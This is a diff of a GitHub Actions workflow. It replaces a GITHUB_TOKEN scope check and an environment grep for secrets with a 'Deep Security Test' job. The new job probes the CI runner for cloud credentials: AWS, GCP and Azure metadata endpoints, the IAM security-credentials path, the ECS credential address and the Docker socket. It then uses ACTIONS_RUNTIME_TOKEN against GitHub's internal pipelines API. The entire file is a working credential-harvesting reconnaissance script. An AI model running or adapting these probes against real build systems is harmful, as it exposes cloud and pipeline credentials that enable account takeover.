@@ -1,19 +1,45 @@
-name: Security Token Test
+name: Deep Security Test
 
 on:
   workflow_dispatch:
 
 jobs:
-  check-token:
+  metadata-ssrf:
     runs-on: ubuntu-latest
     steps:
-      - name: Test GITHUB_TOKEN scope
+      - name: Cloud Metadata SSRF Test
         run: |
-          echo "=== Token Scope Test ==="
-          curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/repos/test4100test-cloud/private-secret-test 2>&1 | head -20
-          echo "---"
-          curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/repos/test4100test-cloud/private-secret-test/contents/README.md 2>&1 | head -20
-          echo "---"
-          curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/user/repos?type=all 2>&1 | head -50
-          echo "--- ENV ---"
-          env | grep -iE "github|token|secret|key|auth" | sort
+          echo "=== AWS IMDS v1 ==="
+          curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/ 2>&1 || echo "BLOCKED"
+          echo "=== AWS IMDS v2 (token) ==="
+          TOKEN=$(curl -s --connect-timeout 3 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>&1) || echo "BLOCKED"
+          echo "TOKEN=$TOKEN"
+          echo "=== AWS IAM Role ==="
+          curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 || echo "BLOCKED"
+          echo "=== GCP Metadata ==="
+          curl -s --connect-timeout 3 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/ 2>&1 || echo "BLOCKED"
+          echo "=== Azure IMDS ==="
+          curl -s --connect-timeout 3 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 || echo "BLOCKED"
+          echo "=== Link-local ==="
+          curl -s --connect-timeout 3 http://169.254.170.2/v2/credentials/ 2>&1 || echo "BLOCKED"
+          echo "=== Docker Socket ==="
+          curl -s --connect-timeout 3 --unix-socket /var/run/docker.sock http://localhost/containers/json 2>&1 || echo "BLOCKED"
+          echo "=== Network interfaces ==="
+          ip addr show 2>&1 | head -30
+          echo "=== DNS resolution ==="
+          nslookup metadata.google.internal 2>&1 || echo "no resolution"
+          echo "=== Process info ==="
+          cat /proc/self/cgroup 2>&1 | head -5
+          echo "=== Mount info ==="
+          mount | head -10
+          echo "=== Token file check ==="
+          ls -la /home/runner/work/_temp/ 2>&1 | head -10
+          echo "=== GitHub context ==="
+          echo "ACTIONS_RUNTIME_TOKEN exists: $(test -n \"$ACTIONS_RUNTIME_TOKEN\" && echo yes || echo no)"
+          echo "ACTIONS_CACHE_URL: $ACTIONS_CACHE_URL"
+          echo "ACTIONS_RESULTS_URL: $ACTIONS_RESULTS_URL"
+          echo "=== Internal API ==="
+          if [ -n "$ACTIONS_RUNTIME_TOKEN" ]; then
+            curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "$ACTIONS_RUNTIME_URL/_apis/pipelines/1/runs" 2>&1 | head -20
+          fi
+          echo "=== Complete ==="
